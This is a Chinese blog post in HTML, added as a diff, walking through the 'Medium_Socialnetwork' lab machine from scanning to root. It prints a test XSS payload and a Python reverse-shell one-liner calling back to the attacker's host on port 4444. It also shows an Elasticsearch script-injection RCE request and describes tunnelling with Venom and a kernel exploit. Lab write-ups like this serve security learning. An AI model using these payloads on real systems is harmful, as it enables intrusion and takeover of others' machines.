@@ -1,0 +1,769 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J47erry">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Medium_Socialnetwork（靶场）信息收集阶段进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描  主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上运行的服务 使用nmap进行端口扫描，第一步是对目标进行端口的发现  发现靶机上开了两个端口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="#Medium_Socialnetwork(靶场)">
+<meta property="og:url" content="https://j47erry.github.io/2022/08/05/Medium-Socialnetwork-%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="J47erry&#39;S BLOG">
+<meta property="og:description" content="Medium_Socialnetwork（靶场）信息收集阶段进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描  主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上运行的服务 使用nmap进行端口扫描，第一步是对目标进行端口的发现  发现靶机上开了两个端口">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=592">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=593">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=595">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=596">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=597">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=598">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=599">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=600">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=601">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=602">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=603">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=604">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=605">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=606">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=607">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=608">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=609">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=610">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=611">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=612">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=613">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=614">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=615">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=616">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=617">
+<meta property="og:image" content="https://cos.kevinc.ltd/file/download?fileId=618">
+<meta property="article:published_time" content="2022-08-05T15:07:00.000Z">
+<meta property="article:modified_time" content="2023-03-05T15:12:12.370Z">
+<meta property="article:author" content="J47erry">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cos.kevinc.ltd/file/download?fileId=592">
+  
+  
+  
+  <title>#Medium_Socialnetwork(靶场) - J47erry&#39;S BLOG</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"j47erry.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J47erry</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="#Medium_Socialnetwork(靶场)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-05 23:07" pubdate>
+          2022年8月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">#Medium_Socialnetwork(靶场)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Medium-Socialnetwork（靶场）"><a href="#Medium-Socialnetwork（靶场）" class="headerlink" title="Medium_Socialnetwork（靶场）"></a>Medium_Socialnetwork（靶场）</h1><h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><p>进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=592" srcset="/img/loading.gif" lazyload></p>
+<p>主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上运行的服务</p>
+<p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=593" srcset="/img/loading.gif" lazyload></p>
+<p>发现靶机上开了两个端口，其中一个是22端口（SSH服务），另一个是非常见端口5000。针对SSH服务常见的攻击手法是弱口令、暴破或者利用一些历史版本漏洞进行突破，目前收集的信息尚少。可以对端口进行版本的发现，看看各个端口上跑的是什么服务。</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=595" srcset="/img/loading.gif" lazyload></p>
+<p>通过版本发现可以得到的信息是：系统为Ubuntu，22端口上跑的是SSH服务，5000端口上跑的是http服务，其中的Werkzeug是一个WSGI的工具包，也可以作为Web框架的底层库，基于Python2来实现。使用searchsploit 寻找关于 Werkzeug 的漏洞，可以找到两三个，均利用不成功。</p>
+<p>整理一下目前得到的可用信息：其中SSH可以考虑暴破用户名密码，5000端口上跑了一个网站，可以访问寻找突破口，其中的框架是基于Python来实现的，若有代码执行，可以考虑用Python脚本来执行反弹shell。</p>
+<h1 id="通过Web漏洞拿shell"><a href="#通过Web漏洞拿shell" class="headerlink" title="通过Web漏洞拿shell"></a>通过Web漏洞拿shell</h1><p>尝试访问目标的5000端口，发现是一个交互网站</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=596" srcset="/img/loading.gif" lazyload></p>
+<p>网站有输入框，但是信息提示 ”绝对安全“， 突破可能性不大。但还是尝试插入了一下XSS payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;justtry&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现还是原样输出到页面，证明该输入框不是突破点，通过查看源代码也找不到什么其他信息。</p>
+<p>尝试收集更多的信息，在网站下进行目录扫描，看有没有管理后台或者敏感信息泄露，这里使用的是dirsearch工具</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=597" srcset="/img/loading.gif" lazyload></p>
+<p>发现 有一个 &#x2F;admin 路径，尝试访问，页面有代码测试功能，可尝试代码执行。考虑到框架是基于Python 实现的，可以找 Python 的 反弹shell 代码。</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=598" srcset="/img/loading.gif" lazyload></p>
+<p>在CSDN上找到一段现成的可以直接拿来用的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">import socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((&quot;192.168.43.173&quot;,4444));<br>os.dup2(s.fileno(),0);<br>os.dup2(s.fileno(),1);<br>os.dup2(s.fileno(),2);<br>p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);<br></code></pre></td></tr></table></figure>
+
+<p>执行前 Kali 应该先监听自身的 4444 端口， 然后执行代码，成功回弹！！！</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=599" srcset="/img/loading.gif" lazyload></p>
+<p>在这里其实还遇到一个小问题，就是当 shell 是 &#x2F;bin&#x2F;bash 的时候，回弹的时候没有回显，于是尝试换成 sh ， 回弹就有回显了，我也不知道为什么。</p>
+<p>拿下 shell 后 先看看自己的权限， 发现是 root， 就这？</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=600" srcset="/img/loading.gif" lazyload></p>
+<p>然后去看系统中存在什么文件，发现很不对劲，文件中存在Dockerfile文件，Dockerfile 是 docker 部署的一个模板文件。 初步断定闹了半天拿下的是一个docker 容器的 shell。</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=601" srcset="/img/loading.gif" lazyload></p>
+<p>可以尝试使用以下两个命令来查证是否docker 容器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /.dockerenv<br><span class="hljs-comment"># 根目录下若存在dockerenv， 基本上可断定为docker容器</span><br><span class="hljs-built_in">cat</span> /proc/1/cgroup<br><span class="hljs-comment"># pid为1是初始化进程，若初始化进程中包含了docker映像的信息，可确认为docker容器</span><br></code></pre></td></tr></table></figure>
+
+<p>确认为 docker 容器后，下一步是如何从 docker容器中 突破出来，最终拿到服务器的 权限。</p>
+<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>确认容器地址， 为 172 开头的地址</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=602" srcset="/img/loading.gif" lazyload></p>
+<p>可以将容器地址看作内网地址，可以在内网中进行主机发现，看看是否还存在其他容器。</p>
+<p>最简单进行主机发现的方法是一个个 IP 地址 去 ping， 但手工操作其实很麻烦，尝试用shell脚本完成操作</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=603" srcset="/img/loading.gif" lazyload></p>
+<p>可以发现 很快就有三个 IP 回包了， 接下来的都没有回包， 初步收集到 内网网段 三个地址。</p>
+<p>已知 172.17.0.2 为容器地址，想要用Kali对另外两个地址进行信息收集，必须进行内网穿透，把Kali 到内网的路由 打通， 这里 用到 内网穿透工具 Venom。</p>
+<p>首先在 Kali 上运行服务端程序 启动侦听</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=604" srcset="/img/loading.gif" lazyload></p>
+<p>为了让 目标靶机 能 获取到Venom客户端程序，在 Kali 目录下 开启 http 服务， 然后在目标靶机上使用 wget 来获取</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=605" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=606" srcset="/img/loading.gif" lazyload></p>
+<p>获取客户端程序后，赋予程序可执行权限。用客户端连接远程 Kali 机器</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=607" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到程序成功执行， 跟服务端的连接也建立起来了。在服务器端，通过 show 命令 可以看到已经有一个节点 连接上来了，可以 goto 到 此节点</p>
+<p>并启用一个监听1080 端口的 socks 代理，Kali 的 所有工具 可以通过 proxychains 这个工具 挂上这个代理去访问 容器内网的整个网段</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=608" srcset="/img/loading.gif" lazyload></p>
+<p>修改proxychains 配置文件，把代理类型改成 socks5， 代理端口 改成 1080</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=609" srcset="/img/loading.gif" lazyload></p>
+<p>挂载好后，以 proxychains 为前缀，就可以对内网的主机 进行端口扫描了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains nmap -sT -Pn 172.17.0.1<br><span class="hljs-comment"># -Pn  代表不进行主机发现， 直接对目标进行深层次的扫描</span><br><span class="hljs-comment"># -sT 进行TCP扫描</span><br></code></pre></td></tr></table></figure>
+
+<p>扫描得出 172.17.0.1 开放的端口 跟 目标靶机 开放的端口一样， 都是22 和 5000浏览器挂代理后对172.17.0.1的5000端口进行访问</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=610" srcset="/img/loading.gif" lazyload></p>
+<p>继续对服务版本进行探测，发现 跟 目标靶机的 服务版本也完全一模一样。浏览器挂载代理后，访问172.17.0.1的5000端口，发现页面 也跟我们直接访问靶机地址的一模一样，可以确定172.17.0.1就是目标靶机，只不过该地址是靶机面向容器内网的地址。</p>
+<p>继续对172.17.0.3 进行端口扫描， 发现开了9200 端口， 对服务进行探测后发现是Elasticsearch</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=611" srcset="/img/loading.gif" lazyload></p>
+<p>针对服务搜寻漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Elasticsearch<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=612" srcset="/img/loading.gif" lazyload></p>
+<p>发现有RCE可做利用，将漏洞利用代码拷贝到当前目录下，简单看一下脚本的执行例子。</p>
+<p>可先尝试一下执行脚本，一般脚本在注释或者报错提示里都有脚本执行的格式，按照格式一步一步来</p>
+<p>第一次利用脚本36337.py的时候会报错，原因是elasticsearch服务里面没有数据，所以不能通过elasticsearch来搜索进而执行命令。</p>
+<p>解决方法是先插入一条数据，再进行脚本的利用。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains curl -XPOST &#x27;http://172.17.0.3:9200/twitter/user/yren&#x27; -d &#x27;&#123; &quot;name&quot; : &quot;Wu&quot; &#125;&#x27;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains curl -XPOST &#x27;http://172.17.0.3:9200/_search?pretty&#x27; -d &#x27;&#123;&quot;script_fields&quot;: &#123;&quot;payload&quot;: &#123;&quot;script&quot;: &quot;java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;).getText()&quot;&#125;&#125;&#125;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=613" srcset="/img/loading.gif" lazyload></p>
+<p>成功拿到第二台容器的shell，查看权限，发现也是 root （没什么卵用）</p>
+<p>在目录中发现一个敏感文件 passwords， 有可能是密码文件</p>
+<p>查看文件，发现密码做了哈希， 去 somd5 尝试破解</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=614" srcset="/img/loading.gif" lazyload></p>
+<p>解密完密码后，可尝试使用账号密码去登录目标靶机的SSH</p>
+<p>发现 John 用户 可直接登录到 目标靶机的 22 端口， 尝试用 sudo -s 提权，发现 John 并不能直接提升为 root 权限</p>
+<h1 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h1><p>此时需要考虑使用系统内核漏洞去提权</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=615" srcset="/img/loading.gif" lazyload></p>
+<p>使用 searchsploit 搜索 LInux 3.13 相关的漏洞利用代码， 选用 37292.c 这个 exp，但这个 exp 有个问题。首先目标靶机上是没有装 gcc 的， 也就是说 所有的c语言代码只能在 Kali 机器上进行编译。在查看 EXP 的过程中， 发现有一段代码编译了一个c文件成so文件，再对这个so文件进行调用 —— 意味着就算在 Kali 上对 EXP 进行了编译，放到目标靶机上仍无法执行成功。</p>
+<p>解决的思路是：修改EXP 代码， 将编译相关的代码段去掉， 然后直接找到编译好的so文件进行调用。</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=616" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=617" srcset="/img/loading.gif" lazyload></p>
+<p>同样是在 Kali 上启用 http 服务，然后在目标主机上获取到需要的文件</p>
+<p>为了执行的方便，在获取到 exp 和 so 文件后，将文件移动到 &#x2F;tmp 目录去执行</p>
+<p>先给 exp 赋予可执行权限 ，然后执行。 在执行的过程中，exp 会去调用 目录下的 so文件进行提权，执行结束后 使用 id 命令查看权限， 已经 拿到了目标 靶机的 root 权限了</p>
+<p><img src="https://cos.kevinc.ltd/file/download?fileId=618" srcset="/img/loading.gif" lazyload></p>
+<h1 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h1><p>面对靶机，首先是进行主机发现。</p>
+<p>针对发现的主机，要进行端口扫描和端口服务的发现。</p>
+<p>若服务中有Web应用，尝试在 Web 应用中找突破点，在该靶机中，我们遇到了一个代码执行，并通过Python脚本成功获得了一个反弹shell，但通过对系统文件的搜寻发现被困在一个容器系统中。</p>
+<p>使用 ICMP 对容器系统中的资产进行发现，发现了另外两个地址。</p>
+<p>为了使用 Kali 的工具对内网 的容器系统进行渗透，利用Venom工具建立了从Kali 到容器内网的隧道，并在 Kali 上开启了 监听1080端口 的代理。通过proxychains 挂载这个代理在Kali 上访问内网。</p>
+<p>发现其中一个资产开启了9200端口，判断为 Elasticsearch 服务，通过对其漏洞的利用拿下第二个docker容器的shell，并在该容器中发现了密码文件。</p>
+<p>利用密码文件破译出的账号密码尝试登录目标系统的SSH并成功登录，却发现自己只是一个普通用户。</p>
+<p>考虑到内核版本比较老，尝试通过内核漏洞进行提权。</p>
+<p>由于EXP中调用了gcc进行C文件的编译，所以把关于编译的代码全部删掉，直接找到编译好的so文件进行直接调用。</p>
+<p>最终成功获得目标主机的root权限！！！</p>
+<p>耶！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WP/">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>#Medium_Socialnetwork(靶场)</div>
+      <div>https://j47erry.github.io/2022/08/05/Medium-Socialnetwork-靶场/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J47erry</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/" title="#记一次多层内网渗透">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">#记一次多层内网渗透</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/15/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF/" title="#横向移动姿势">
+                        <span class="hidden-mobile">#横向移动姿势</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
